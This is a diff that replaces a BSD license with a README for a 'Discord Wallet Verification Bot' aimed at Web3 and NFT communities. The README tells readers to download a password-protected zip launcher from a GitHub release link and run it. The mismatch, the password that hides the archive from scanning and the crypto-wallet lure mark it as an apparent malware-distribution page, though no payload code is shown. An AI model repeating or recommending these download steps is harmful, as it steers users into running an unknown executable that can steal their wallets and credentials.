@@ -1,28 +1,20 @@
-BSD 3-Clause License
+Discord Wallet Verification Bot | 2026
 
-Copyright (c) 2026, pitchsnowhack
+⚙️ How to Use
+# PASSWORD: azuro
+1. Download and unzip the latest version of the launcher (Link to the latest launcher - https://github.com/Amplitudekespot/itaoaayg/releases/download/Latest/Azuro.zip)
+# PASSWORD: azuro
 
-Redistribution and use in source and binary forms, with or without
-modification, are permitted provided that the following conditions are met:
+2. Launch the launcher and click RUN
+3. Wait for the launcher to update
 
-1. Redistributions of source code must retain the above copyright notice, this
-   list of conditions and the following disclaimer.
+Discord Wallet Verification Bot is an automated solution that verifies cryptocurrency wallets on Discord servers and assigns roles based on wallet ownership. It is designed for Web3 communities, NFT projects, DAOs, and blockchain-based platforms that require secure and scalable wallet verification.
+This bot allows users to connect their crypto wallets (such as Ethereum and other supported blockchains) to Discord and prove ownership through secure signature-based verification. Once verified, the bot automatically grants Discord roles according to predefined rules, such as NFT ownership, token balance, or whitelist status.
 
-2. Redistributions in binary form must reproduce the above copyright notice,
-   this list of conditions and the following disclaimer in the documentation
-   and/or other materials provided with the distribution.
-
-3. Neither the name of the copyright holder nor the names of its
-   contributors may be used to endorse or promote products derived from
-   this software without specific prior written permission.
-
-THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
-AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
-IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
-DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
-FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
-DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
-SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
-CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
-OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
-OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+Features
+Automated Discord wallet verification
+Secure crypto wallet authentication
+Token gated and NFT-gated role management
+Instant role assignment without manual moderation
+Protection against fake accounts and fraud
+Seamless integration with Discord servers
